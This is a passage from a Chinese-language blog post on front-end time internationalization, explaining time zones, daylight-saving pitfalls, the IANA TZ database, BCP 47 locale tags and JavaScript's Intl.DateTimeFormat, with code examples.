对象的使用指南，而是只专注于前端时间国际化。</strong></p>\n<h1>从时区说起</h1>\n<p>要想处理时间，UTC 是一个绕不开的名字。协调世界时（Coordinated Universal Time）是目前通用的世界时间标准，计时基于原子钟，但并不等于 TAI（国际原子时）。TAI 不计算闰秒，但 UTC 会不定期插入闰秒，因此 UTC 与 TAI 的差异正在不断扩大。UTC 也接近于 GMT（格林威治标准时间），但不完全等同。可能很多人都发现近几年 GMT 已经越来越少出现了，这是因为 GMT 计时基于地球自转，由于地球自转的不规则性且正在逐渐变慢，目前已经基本被 UTC 所取代了。</p>\n<blockquote><p>JavaScript 的 <code>Date</code> 实现不处理闰秒。实际上，由于闰秒增加的不可预测性，Unix/POSIX 时间戳完全不考虑闰秒。在闰秒发生时，Unix 时间戳会重复一秒。这也意味着，一个时间戳对应两个时间点是有可能发生的。</p></blockquote>\n<p>由于 UTC 是标准的，我们有时会使用 UTC+/-N 的方式表达一个时区。这很容易理解，但并不准确。中国通行的 <code>Asia/Shanghai</code> 时区<strong>大部分</strong>情况下可以用 UTC+8 表示，但英国通行的 <code>Europe/London</code> 时区并不能用一个 UTC+N 的方式表示——由于夏令时制度，<code>Europe/London</code> 在夏天等于 UTC+1，在冬天等于 UTC/GMT。</p>\n<blockquote><p>一个时区与 UTC 的偏移并不一定是整小时。如 <code>Asia/Yangon</code> 当前为 UTC+6:30，而 <code>Australia/Eucla</code> 目前拥有奇妙的 UTC+8:45 的偏移。</p></blockquote>\n<p>夏令时的存在表明<strong>时间的表示不是连续的</strong>，时区之间的时差也并不是固定的，我们并不能用固定时差来处理时间，这很容易意识到。但一个不容易意识到的点是，时区还包含了其历史变更信息。中国目前不实行夏令时制度，那我们就可以放心用 UTC+8 来表示中国的时区了吗？你可能已经注意到了上一段中描述 <code>Asia/Shanghai</code> 时区时我使用了<strong>大部分</strong>一词。<code>Asia/Shanghai</code> 时区在历史上实行过夏令时，因此 <code>Asia/Shanghai</code> 在部分时间段可以使用 UTC+9 来表示。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">new Date('1988-04-18 00:00:00')\n// Mon Apr 18 1988 00:00:00 GMT+0900 (中国夏令时间)</pre>\n<blockquote><p>夏令时已经够混乱了，但它实际上比你想象得更混乱——部分穆斯林国家一年有四次夏令时切换（进入斋月时夏令时会暂时取消），还有一些国家使用混沌的 15/30 分钟夏令时而非通常的一小时。</p></blockquote>\n<blockquote><p><strong>不要总是基于 <code>00:00</code> 来判断一天的开始。</strong>部分国家使用 0:00-1:00 切换夏令时，这意味着 23:59 的下一分钟有可能是 1:00。</p></blockquote>\n<p>事实上，虽然一天只有 24 个小时，但当前（2021.10）正在使用的时区有超过 300 个。<strong>每一个时区都包含了其特定的历史。</strong>虽然有些时区在现在看起来是一致的，但它们都包含了不同的历史。时区也会创造新的历史。由于政治、经济或其他原因，一些时区会调整它们与 UTC 的偏差（萨摩亚曾经从 UTC-10 切换到 UTC+14，导致该国 2011.12.30 整一天都消失了），或是启用/取消夏令时，甚至有可能导致一个时区重新划分为两个。因此，为了正确处理各个时区，我们需要一个数据库来存放时区变更信息。还好，已经有人帮我们做了这些工作。目前大多数 *nix 系统和大量开源项目都在使用 <a href=\"https://www.iana.org/time-zones\" rel=\"noopener\">IANA 维护的时区数据库</a>（IANA TZ Database），其中包含了自 Unix 时间戳 0 以来各时区的变更信息。当然这一数据库也包含了大量 Unix 时间戳 0 之前的时区变更信息，但并不能保证这些信息的准确性。IANA 时区数据库会定期更新，以反映新的时区变更和新发现的历史史实导致的时区历史变更。</p>\n<blockquote><p>Windows 不使用 IANA 时区数据库。微软为 Windows 自己维护了一套<a href=\"https://docs.microsoft.com/zh-cn/troubleshoot/windows-client/system-management-components/daylight-saving-time-help-support\" rel=\"noopener\">时区数据库</a>，这有时会导致在一个系统上合法的时间在另一系统上不合法。</p></blockquote>\n<p>既然我们不能使用 UTC 偏移来表示一个时区，那就只能为每个时区定义一个标准名称。通常地，我们使用 <code>/</code> 来命名一个时区。这里的城市一般为该时区中人口最多的城市。于是，我们可以将中国的通行时区表示为 <code>Asia/Shanghai</code>。也有一些时区有自己的别名，如太平洋标准时间 <code>PST</code> 和协调世界时 <code>UTC</code>。</p>\n<blockquote><p>时区名称使用城市而非国家，是由于国家的变动通常比城市的变动要快得多。</p></blockquote>\n<blockquote><p><strong>城市不是时区的最小单位。</strong>有很多城市同时处于多个时区，甚至澳大利亚<a href=\"https://en.wikipedia.org/wiki/Gold_Coast_Airport\" rel=\"noopener\">有一个机场</a>的跑道两端处于不同的时区。</p></blockquote>\n<h1>处理时区困难重重</h1>\n<p>几个月前的一天，<a href=\"https://milkice.me/\" rel=\"noopener\">奶冰</a>在他的 Telegram 频道里发了这样的一条消息：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-1.jpg\"><img src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-1.jpg\" alt=\"奶冰频道的消息\" width=\"500\" class=\"aligncenter size-medium wp-image-2490\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-1.jpg 800w, https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-1-244x300.jpg 244w, https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-1-768x944.jpg 768w\" sizes=\"(max-width: 800px) 100vw, 800px\"></a>\n<p>你想的没错，这个问题正是由时区与 UTC 偏移的不同造成的。<code>Asia/Shanghai</code> 时区在 1940 年前后和 1986 年前后曾实行过夏令时，<strong>而夏令时的切换会导致一小时的出现和消失。</strong>具体来说，启用夏令时当天会有一个小时消失，如 2021.3.28 英国启用夏令时，1:00 直接跳到 3:00，导致 <code>2021-03-28 01:30:00</code> 在 <code>Europe/London</code> 时区中是不合法的；取消夏令时当天又会有一个小时重复，如 2021.10.31 英国取消夏令时，2:00 会重新跳回 1:00 一次，导致 <code>2021-10-31 01:30:00</code> 在 <code>Europe/London</code> 时区中对应了两个时间点。而在奶冰的例子中，<code>1988-04-10 00:46:50</code> 正好处于因夏令时启用而消失的一小时中，因此系统会认为此时间字符串不合法而拒绝解析。</p>\n<blockquote><p>你可能会注意到在历史上 1988.4.10 这一天 <code>Asia/Shanghai</code> 时区实际上是去掉了 1:00-2:00 这一小时而不是 0:00-1:00。上文问题更深层次的原因是，在 IANA TZDB 2018a 及更早版本中，IANA 因缺乏历史资料而设置了错误的夏令时规则，规则设定了夏令时交界于 0:00-1:00 从而导致上文问题发生。而随后社区<a href=\"http://mm.icann.org/pipermail/tz/2018-August/026760.html\" rel=\"noopener\">发现了更准确的史实</a>，因此 IANA 更新了数据库。上文的问题在更新了系统的时区数据库后便解决了。</p></blockquote>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-2.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-2.jpg\" alt=\"IANA TZDB 2018a 及之前版本的错误数据\" width=\"1750\" height=\"595\" class=\"aligncenter size-full wp-image-2491\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-2.jpg 1750w, https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-2-300x102.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-2-1024x348.jpg 1024w, https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-2-768x261.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-2-1536x522.jpg 1536w\" sizes=\"(max-width: 1750px) 100vw, 1750px\"></a>\n<p><span>IANA TZDB 2018a 及之前版本的错误数据</span></p>\n<p>再来考虑另一种情况。你的应用的某位巴西用户在 2018 年保存了一个未来时间 <code>2022-01-15 12:00</code>（按当时的规律那应该是个夏令时时间），不巧那时候你的应用是以格式化的时间字符串形式保存的时间。之后你发现巴西已经于 2019 年 4 月宣布彻底取消夏令时制度，那么 <code>2022-01-15 12:00</code> 这个时间对应的 Unix 时间戳发生了变化，变得不再准确，要正确处理这一字符串就需要参考这一字符串生成的时间（或生成时计算的 UTC 偏移）来做不同的处理。<strong>因此，应用从一开始就应该避免使用字符串来传输、存储时间，而是使用 Unix 时间戳。</strong>如果不得不使用字符串存储时间，请尽可能：</p>\n<ul>\n<li>使用 UTC 描述时间，你永远不会知道本地时区在未来会发生什么</li>\n<li>如果需要以当地时间描述时间，一定带上当前 UTC 偏移</li>\n</ul>\n<p>时区历史带来的问题往往意想不到而且远比想象得多。实际上时区历史数据非常详细而繁多且跨设备不一致，并没有简单而统一的处理方法。在需要严谨处理时区时可能需要在应用程序中内嵌一套各端统一的时区数据库，但这样的方案放在前端又会带来不少问题：</p>\n<ul>\n<li>体积过大。moment.js 曾经设计过<a href=\"https://github.com/moment/moment-timezone/blob/develop/data/packed/2021a.json\" rel=\"noopener\">一种简洁的 TZDB 表示</a>，但尽管已经尽可能压缩整个文件仍然达到了 180+KB。在性能优先的 Web 应用中这是不可接受的</li>\n<li>需要持续更新。时区数据一直在变动，需要在时区数据更新时尽快更新应用内的时区数据，这带来了额外的维护成本</li>\n</ul>\n<p>ES6 为我们带来了 <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Intl\" rel=\"noopener\"><code>Intl</code> 命名空间</a>。在这里，JavaScript 运行时提供了不少时间相关的国际化能力。因此，在不使用额外数据的情况下准确处理时区是可能的，但这并不完美：</p>\n<ul>\n<li>各端不统一。浏览器提供的时区数据受浏览器版本、系统版本等可能变化，最新的时区更新可能无法快速反映到所有设备上</li>\n<li>实现复杂。<code>JavaScript</code> 中 <code>Date</code> 对象的不良设计导致实现完善的时区处理并不容易，且 <code>Intl</code> 命名空间下的对象实例化性能开销较大，需要额外优化</li>\n</ul>\n<blockquote><p><code>Intl</code> 命名空间下还有很多实用的国际化相关方法，值得我们另开一篇文章来讲讲了。</p></blockquote>\n<p>在真实开发中，这需要取舍。目前主流的 JavaScript 时间处理库都已转向浏览器内置方法，并在需要时通过 Polyfill 保证跨端一致性。在这篇文章中，我们将尝试在不使用第三方库的情况下实现基本的时间国际化处理。此外，还有一些诸如需要使用 Unix 时间戳才能正确地在各端交换时间等细节需要注意。</p>\n<h1>时区转换</h1>\n<p>JavaScript 中的 <code>Date</code> 并不是不包含时区信息——实际上，<code>Date</code> 对象表示的一定是当前时区。通过尝试：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">new Date('1970-01-01T00:00:00Z')\n// Thu Jan 01 1970 08:00:00 GMT+0800 (中国标准时间)</pre>\n<p>就可以知道，JavaScript 运行时其实知道当前时区，并会在需要的时候将其他时区的时间转换为当前时区的时间。那么，如何将本地时间转换为其他时区的时间呢？从 <code>Date</code> 的角度看，这并不行，因为我们无法设置一个 <code>Date</code> 对象的时区。但我们可以“投机取巧”：将 <code>Date</code> 对象的时间加上/减去对应的时差，尽管 <code>Date</code> 对象仍然认为自己在本地时区，但这样不就可以正确显示了嘛！但我们会碰到上文提到的问题：时区之间的时间差并不固定，在没有额外数据的情况下很难正确计算。</p>\n<p>还好，ES6 基于 <code>Intl</code> 命名空间扩展了 <code>Date.prototype.toLocaleString()</code> 方法，使其可以接受时区参数并按指定时区格式化时间。如果你在搜索引擎中搜索如何使用 JavaScript 转换时区，你大概率会在 StackOverflow 上找到类似这样的答案：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const convertTimeZone = (date, timeZone) =&gt; {\n    return new Date(date.toLocaleString('en-US', { timeZone }))\n}\n\nconst now = new Date() // Wed Oct 13 2021 01:00:00 GMT+0800 (中国标准时间)\nconvertTimeZone(now, 'Europe/London') // Tue Oct 12 2021 18:00:00 GMT+0800 (中国标准时间)</pre>\n<p>很好理解，我们使用 <code>en-US</code> 的区域设置要求 JavaScript 运行时以我们指定的时区格式化时间，再将时间字符串重新解析为时间对象。这里的 <code>timeZone</code> 就是诸如 <code>Asia/Shanghai</code> 等的 IANA TZDB 时区名称。这个字符串确实需要自己提供，但这就是我们唯一需要自己准备的数据了！只要提供了时区名称，浏览器就会自动计算正确的时间，无需我们自行计算。</p>\n<blockquote><p>对于时区名称，你可以考虑使用 <a href=\"https://github.com/vvo/tzdb/\" rel=\"noopener\">@vvo/tzdb</a>。这是一个声称为自动更新的 IANA TZDB 的 JSON 导出，并已被数个大型项目使用。你可以从这个包中导出所有时区名称。</p></blockquote>\n<p>这个方法看起来还不错，对吧？但实际上，它有两个问题：</p>\n<ul>\n<li>指定了区域设置和时区的 <code>toLocaleString()</code> 实际上每次调用都会在 JavaScript 运行时中创建新的 <code>Intl.DateTimeFormat</code> 对象（在后文详述），而后者会带来昂贵的性能开销（在 Node 14 中，实例化一次会在 V8 中增加内存使用约 46.3Kb。但这是符合预期的，详见 <a href=\"https://bugs.chromium.org/p/v8/issues/detail?id=6528\" rel=\"noopener\">V8 Issue</a>）。因此，在密集调用的情况下需要考虑计算并缓存时差，并在一定时间后或需要时进行更新</li>\n<li>使用 <code>toLocaleString()</code> 并使用 <code>en-US</code> 区域设置格式化的默认时间格式类似于 <code>10/13/2021, 1:00:00 AM</code>。这可以被大部分浏览器正确解析，<strong>但这是不规范的，不同浏览器有可能产生不同结果。</strong>你也可以自行配置格式（同下文的 <code>Intl.DateTimeFormat</code>），但仍然无法构造出规范的字符串</li>\n</ul>\n<p>因此，更佳的方案是，我们需要建立一个可反复使用的格式化器以避免重复创建 <code>Intl.DateTimeFormat</code> 带来的额外开销，并需要手动构造出符合规范的时间字符串，并将其重新解析为 <code>Date</code> 对象。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const timeZoneConverter = (timeZone) =&gt; {\n    // 新建 DateTimeFormat 对象以供对同一目标时区重用\n    // 由于时区属性必须在创建 DateTimeFormat 对象时指定，我们只能为同一时区重用格式化器\n    const formatter = new Intl.DateTimeFormat('zh-CN', {\n        year: 'numeric',\n        month: '2-digit',\n        day: '2-digit',\n        hour: '2-digit',\n        minute: '2-digit',\n        second: '2-digit',\n        hour12: false,\n        timeZone\n    })\n    return {\n        // 提供 conver 方法以将提供的 Date 对象转换为指定时区\n        convert (date) {\n            // zh-CN 的区域设置会返回类似 1970/01/01 00:00:00 的字符串\n            // 替换字符即可构造出类似 1970-01-01T00:00:00 的 ISO 8601 标准格式时间字符串并被正确解析\n            return new Date(formatter.format(date).replace(/\\//g, '-').replace(' ', 'T').trim())\n        }\n    }\n}\n\nconst toLondonTime = timeZoneConverter('Europe/London') // 对于同一时区，此对象可重用\n\nconst now = new Date() // Wed Oct 13 2021 01:00:00 GMT+0800 (中国标准时间)\ntoLondonTime.convert(now) // Tue Oct 12 2021 18:00:00 GMT+0800 (中国标准时间)</pre>\n<blockquote><p>目前 <code>zh-CN</code> 的区域设置会产生类似 <code>1970/01/01 00:00:00</code> 的格式化字符串。这一格式目前跨端一致，但由于规范没有指定时间格式，<strong>这个格式在未来有可能变更。</strong>更好的方案是使用 <code>formatToParts()</code> 方法（在后文详述）获取时间字符串的各部分并手动拼接出标准格式的字符串，但在这个例子中直接 <code>replace</code> 拥有更好的性能。</p></blockquote>\n<p>现在，尝试反复转换时间至同一时区 1000 次，耗时从 <code>toLocaleString()</code> 1.5 秒降低到了 0.04 秒。尽管代码长了点，但这次重写在最好的情况下为我们带来了超过 20 倍的性能提升。</p>\n<p>需要注意的是，虽然这看起来就算最终方案了，但这个方案依然不完美。主要有以下两个问题：</p>\n<ul>\n<li>在需要密集转换为不同时区时，由于无法重用格式化器，性能依然较差且难以进一步优化</li>\n<li>由于 <code>Intl.DateTimeFormat</code> 不支持格式化毫秒，在格式化字符串的过程中毫秒会丢失，导致最终结果可能会与期望结果产生最高 999ms 的误差，需要额外处理。比如需要计算时差时，我们可能需要这么写：\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const calcTimeDiff = (date, converter) =&gt; {\n    const secDate = date - date.getMilliseconds() // 去掉毫秒，避免转换前后精度差异\n    return converter.convert(new Date(secDate), tzName) - secDate\n}\n\ncalcTimeDiff(new Date(), timeZoneConverter('Europe/London')) // -25200000</pre>\n</li>\n</ul>\n<p>无论如何，在折腾一番后我们还是把时区正确转换了。接下来准备格式化时间字符串了吗？不过在此之前，我们得先来聊聊语言、文字和区域。</p>\n<h1>语言文字区域傻傻分不清</h1>\n<blockquote><p>如何在计算机中表示中文？</p></blockquote>\n<p>“这不简单，”你可能会说，“用 <code>zh</code> 啊。”</p>\n<blockquote><p>那简体中文呢？</p></blockquote>\n<p>“<code>zh-CN</code>。”你或许会说出这个答案。</p>\n<blockquote><p>那用于新加坡的简体中文和用于中国大陆的简体中文该如何区分呢？</p></blockquote>\n<p>嗯……好问题。</p>\n<p>要能正确区分不同的简体中文，我们还得先回到定义上。实际上，“国际化”并不只是语言的翻译而已，国际化包含的是一整套对于各个<strong>区域</strong>的本地化方案。要准确表示一个国际化方案，我们实际至少需要确定三个属性：语言（Language）、文字（Script）和区域（Locale）。</p>\n<ul>\n<li>\n<strong>语言</strong>通常指的是<strong>声音语言</strong>。不同的语言都有一套自己的发音规则，很难互通。如中文和英语都属于语言</li>\n<li>\n<strong>文字</strong>对应的是某个语言的书写方式，同样的语言可能会有多种书写方案。如中文主要有简体和繁体两种书写方案</li>\n<li>\n<strong>区域</strong>指国际化面向的地区，相同的语言和文字，在不同地区也有可能会有不同的使用习惯。如新加坡和中国大陆都使用简体中文，但两地的用词习惯等有些许差异</li>\n</ul>\n<p>只有确定了这三个属性，我们才能正确定义一个国际化方案（或者说<strong>区域设置</strong>）。当然，还有很多其他属性可以更准确的表达某个区域设置，但通常有语言、文字和区域就已经足够了。</p>\n<p>于是，基于 <a href=\"https://tools.ietf.org/rfc/bcp/bcp47.txt\" rel=\"noopener\">BCP 47</a>，我们可以知道：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"raw\">cmn-Hans-CN = 中文普通话-简体-中国大陆\ncmn-Hans-SG = 中文普通话-简体-新加坡\ncmn-Hant-TW = 中文普通话-繁体-台湾\nyue-Hant-HK = 中文粤语-繁体-香港</pre>\n<p>等等，这都是啥？还有 BCP 47 又是啥？BCP 是 IETF 发布的“最佳当前实践”文档，而 BCP 47 是一些国际化相关的 ISO 和备忘录的集合，也是目前事实上由 HTML 和 ECMAScript 所使用的表达区域设置的标准。BCP 47 定义的区域设置标签实际上比较复杂，但对于大部分简单使用情况，上文示例中的格式已经完全够用了。简单来说，<strong>要表达一个区域设置，我们会使用 <code>语言[-文字][-区域]</code> 的格式，而文字和区域都是可选的。</strong>而对于每个部分的具体代码，BCP 47 也有做具体定义。其中：</p>\n<ul>\n<li>语言使用 ISO 639-1 定义的两位字母代码（如中文为 <code>zh</code>，英文为 <code>en</code>）或 <a href=\"https://iso639-3.sil.org/code_tables/639/data\" rel=\"noopener\">ISO 639-2/3</a> 定义的三位字母代码（如中文普通话为 <code>cmn</code>，英文为 <code>eng</code>），通常小写</li>\n<li>文字使用 <a href=\"https://unicode.org/iso15924/iso15924-codes.html\" rel=\"noopener\">ISO 15924</a> 定义的四位字母代码，通常首字母大写。如简体中文是 <code>Hans</code>，繁体中文是 <code>Hant</code>\n</li>\n<li>区域通常使用 <a href=\"https://www.iso.org/iso-3166-country-codes.html\" rel=\"noopener\">ISO 3166-1</a> 定义的两位字母代码，通常大写，如中国大陆为 <code>CN</code>，英国为 <code>GB</code>\n</li>\n</ul>\n<blockquote><p>ISO 639-1/2/3 的关系实际是：ISO 639-1 是最早制定的规范，使用两位字母表示语言，但语言数量之多并不能只用两位代码表示。因此后来修订了 ISO 639-2 和 3，使用三位字母表示了更多语言。通常 639-1 代码和 ISO-2/3 代码是一对多的关系。如中文 <code>zh</code> 其实是中文普通话 <code>cmn</code> 的宏语言（macrolanguage），同样使用 <code>zh</code> 为宏语言的语言还有 <code>wuu</code>（中文吴语）、<code>hak</code>（中文客家话）、<code>yue</code>（中文粤语）等数十种。<strong>从规范上我们现在应该使用 ISO 639-2/3 代码来替代 ISO 639-1 代码了</strong>，但由于历史阻力和真实需求中分类无需如此细致等原因，<strong>使用 ISO 639-1 指定语言仍然非常常见而且完全可以接受。</strong>此外，特别地，我们在 ISO 639-3 中定义未指明的语言为 <code>und</code>。</p></blockquote>\n<p>因此，对于这一节开头的两个问题，在 BCP 47 中正确答案其实是：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"raw\">zh = 中文\ncmn = 中文普通话\n\nzh-Hans = 中文-简体\ncmn-Hans = 中文普通话-简体</pre>\n<p>而 <code>zh-CN</code> 实际是指在中国大陆使用的中文，当然也包含在中国大陆使用的繁体中文。<strong>不过，由于大部分情况下一个区域只会通用一种文字，很多情况下我们可以忽略文字这一项</strong>，即使用 <code>zh-CN</code>（或者 <code>cmn-CN</code>）来表示中国大陆的简体中文普通话——毕竟在大部分业务中在中国大陆使用繁体和非普通话的情况非常少。</p>\n<blockquote><p>事实上，类似 <code>zh-Hans</code> 和 <code>zh-Hant</code> 开头的区域设置名称已经被标记为 <code>redundant 废弃</code>，因此尽可能只使用 <code>zh-CN</code> 或者 <code>cmn-Hans-CN</code> 这样的区域设置名称。所有区域设置名称的列表可以在 <a href=\"https://www.iana.org/assignments/language-subtag-registry/language-subtag-registry\" rel=\"noopener\">IANA</a> 找到。</p></blockquote>\n<p>现在我们可以准确定义一个区域设置了。不过我们还有一些小小的需求。比如我们想在 <code>cmn-Hans-CN</code> 的区域设置中使用农历来表示日期，但显然我们上文定义的表示方法并不能表达这一需求。好在，Unicode 为 BCP 47 提供了 u 扩展。在区域设置名称后面加上 <code>-u-[选项]</code> 就可以表达更细致的变体了。所以我们有：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"raw\">cmn-Hans-CN-u-ca-chinese = 中文普通话-简体-中国大陆-u-日历-中国农历\njpn-Jpan-JP-u-ca-japanese = 日语-日文汉字/平假名/片假名-日本-u-日历-日本日历\ncmn-Hans-CN-u-nu-hansfin = 中文普通话-简体-中国大陆-u-数字-简体大写数字</pre>\n<p>u 扩展的具体可选项可以在 <a href=\"https://www.unicode.org/reports/tr35/tr35-21.html#Unicode_locale_identifier\" rel=\"noopener\">Unicode 网站</a>上找到。而多个 u 扩展还可以连接——于是我们甚至可以写出 <code>cmn-Hans-CN-u-ca-chinese-nu-hansfin</code> 这种丧心病狂的区域设置名称。当然，相信你现在已经可以看懂这个区域设置的意思了。</p>\n<blockquote><p>不同地区可能会有不同的日历使用习惯，如中国有使用农历的需求，泰国有使用佛历的需求，我们可以通过 u 扩展指定不同的日历。不过，大部分情况下我们会使用标准的 ISO 8601 日历（gregory），JavaScript 的 <code>Date</code> 对象也只支持这种日历。</p></blockquote>\n<blockquote><p>你可以使用 <a href=\"https://r12a.github.io/app-subtags/\" rel=\"noopener\">BCP47 language subtag lookup</a> 工具快速检查你编写的 BCP 47 区域标签是否规范。</p></blockquote>\n<p>终于我们可以正确表达一个完美符合我们需求的区域设置了。接下来，让我们开始格式化时间吧。</p>\n<h1>格式化时间</h1>\n<p>这题我会！</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const formatDate(date) =&gt; {\n    return `${date.getFullYear()}-${`${date.getMonth() + 1}`.padStart(2, '0')}-${`${date.getDate()}`.padStart(2, '0')} ${`${date.getHours()}`.padStart(2, '0')}:${`${date.getMinutes()}`.padStart(2, '0')}:${`${date.getSeconds()}`.padStart(2, '0')}`\n}\n\nformatDate(new Date()) // 2021-10-13 01:00:00</pre>\n<p>就完事了……吗？先不论这样的格式化代码难以阅读，尽管上文这样的日期格式国际通用，<strong>但并非所有区域都习惯于这样的日期表示方法。</strong>比如英语国家/地区在很多时候习惯在日期中加入星期，而阿拉伯语国家/地区在部分情况下习惯使用阿拉伯语数字（而非常用的阿拉伯-印度数字）；再比如美式英语国家/地区习惯月-日-年的日期表示法，而英式英语国家/地区习惯日-月-年的日期表示法……不同区域在时间表示格式习惯上的差异是巨大的，<strong>我们很难通过一个简单的方法来正确地、国际化地格式化一个日期。</strong></p>\n<p>好在 ES6 早就为我们铺平了道路。还记得上文提到过的 <code>Intl.DateTimeFormat</code> 吗？我们通过它来实例化一个日期格式化器并用进行日期的国际化。</p>\n<p>直接来看例子吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const options = {\n    year: 'numeric',\n    month: 'short',\n    day: 'numeric',\n    weekday: 'long'\n}\nconst now = new Date()\n\nconst enUSFormatter = new Intl.DateTimeFormat('en-US', options)\n\nconst zhCNFormatter = new Intl.DateTimeFormat('zh-CN', options)\nconst zhCNAltFormatter = new Intl.DateTimeFormat('zh-CN-u-ca-chinese', options)\nconst zhCNAlt2Formatter = new Intl.DateTimeFormat('zh-CN-u-ca-roc-nu-hansfin', options)\n\nconst jaFormatter = new Intl.DateTimeFormat('ja', options)\nconst jaAltFormatter = new Intl.DateTimeFormat('ja-JP-u-ca-japanese', options)\n\nconst arEGFormatter = new Intl.DateTimeFormat('ar-EG', options)\n\nenUSFormatter.format(now) // Wednesday, Oct 13, 2021\n\nzhCNFormatter.format(now) // 2021年10月13日星期三\nzhCNAltFormatter.format(now) // 2021辛丑年九月8星期三\nzhCNAlt2Formatter.format(now) // 民国壹佰壹拾年拾月拾叁日星期三\n\njaFormatter.format(now) // 2021年10月13日水曜日\njaAltFormatter.format(now) // 令和3年10月13日水曜日\n\narEGFormatter.format(now) // الأربعاء، ١٣ أكتوبر ٢٠٢١</pre>\n<blockquote><p>在这里我们使用 ISO 639-1 代码来表示语言，是由于事实上 ISO 639-1 代码更加常见与通用。在大部分支持 <code>Intl.DateTimeFormat</code> 的 JavaScript 运行时中我们也可以使用 ISO 639-2/3 代码来表示语言（但实际会 fallback 至对应的 ISO 639-1 代码）。</p></blockquote>\n<blockquote><p>你也可以通过在 <code>options</code> 中设置 <code>calendar</code> 属性和 <code>numberingSystem</code> 属性来替换区域设置名称中对 u 扩展的使用。这也是推荐方式。</p></blockquote>\n<p>这非常直观，我们可以指定区域设置和格式化选项来初始化一个格式化器，并在之后使用格式化器对象的 <code>format</code> 方法来格式化一个 <code>Date</code> 对象。这里的格式化选项其实非常灵活，能格式化的不只是日期，时间也可以被灵活地格式化，有非常多的组合可以选择。我们不会在这里详细解释每一个选项，你可以访问 <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Intl/DateTimeFormat\" rel=\"noopener\">MDN 文档</a>来了解更多。</p>\n<blockquote><p>如前文所述，<code>Intl.DateTimeFormat</code> 无法格式化毫秒。</p></blockquote>\n<p>不过需要注意的是，<strong>JavaScript 运行时不一定支持所有区域设置，也不一定支持所有格式化选项。</strong>在遇到不支持的情况时，<code>Intl.DateTimeFormat</code> 默认会静默 fallback 到最匹配的支持项，因此在处理不常见的区域设置或选项时，你可能需要再额外检查。你可以通过 <code>Intl.DateTimeFormat.supportedLocalesOf()</code> 静态方法判断当前运行时是否支持指定的区域设置，也可以在实例化格式化器后在对象上调用 <code>resolvedOptions()</code> 方法来检查运行时的解析结果是否与预期一致。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">new Intl.DateTimeFormat('yue-Hant-CN').resolvedOptions()\n// {locale: 'zh-CN', calendar: 'gregory', …}\n// fallback 至 zh-CN，与 yue-CN 的预期不一致</pre>\n<p>此外，正如你所看到的，各种语言在日期格式化中使用的文本 JavaScript 运行时都已经帮我们内置了。因此，我们甚至可以利用这些国际化特性来为我们的应用减少一点需要翻译的字符串——打包进应用的翻译越少，应用体积也就越小了嘛——比如说获取一周七天对应的名字：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const getWeekdayNames = (locale) =&gt; {\n     // 基于一个固定日期计算，这里选择 1970.1.1\n     // 不能使用 0，因为 Unix 时间戳 0 在不同时区的日期不一样\n    const base = new Date(1970, 0, 1).getTime()\n    const formatter = new Intl.DateTimeFormat(locale, { weekday: 'short' })\n    return Array.from({ length: 7 }, (_, day) =&gt; (\n        formatter.format(new Date(base + 3600000 * 24 * (-4 + day))) // 1970.1.1 是周四\n    ))\n}\n\ngetWeekdayNames('en-US') // ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat']\ngetWeekdayNames('zh-CN') // ['周日', '周一', '周二', '周三', '周四', '周五', '周六']\ngetWeekdayNames('ja') // ['日', '月', '火', '水', '木', '金', '土']\ngetWeekdayNames('ar-EG') // ['الأحد', 'الاثنين', 'الثلاثاء', 'الأربعاء', 'الخميس', 'الجمعة', 'السبت']</pre>\n<p>当然，如果你还是不喜欢运行时为你提供的格式，我们还有上文提到过的 <code>formatToParts()</code> 方法可以用。来看一个简单的例子吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">new Intl.DateTimeFormat('zh-CN', {\n    year: 'numeric',\n    month: 'short',\n    day: 'numeric',\n    weekday: 'long',\n    hour: 'numeric',\n    minute: 'numeric',\n    second: 'numeric',\n}).formatToParts(new Date())\n// [\n//     { type: 'year', value: '2021' },\n//     { type: 'literal', value: '年' },\n//     { type: 'month', value: '10' },\n//     { type: 'literal', value: '月' },\n//     { type: 'day', value: '13' },\n//     { type: 'literal', value: '日' },\n//     { type: 'weekday', value: '星期三' },\n//     { type: 'literal', value: ' ' },\n//     { type: 'dayPeriod', value: '上午' },\n//     { type: 'hour', value: '1' },\n//     { type: 'literal', value: ':' },\n//     { type: 'minute', value: '00' },\n//     { type: 'literal', value: ':' },\n//     { type: 'second', value: '00' }\n// ]</pre>\n<p>随后，你就可以自己解析这个数组来构造出你想要的时间格式了。最后，我们还可以使用 <code>Intl.RelativeTimeFormat</code> 来格式化相对日期。当然我们不会在这里详细讲解这个 API，你可以参考 <a 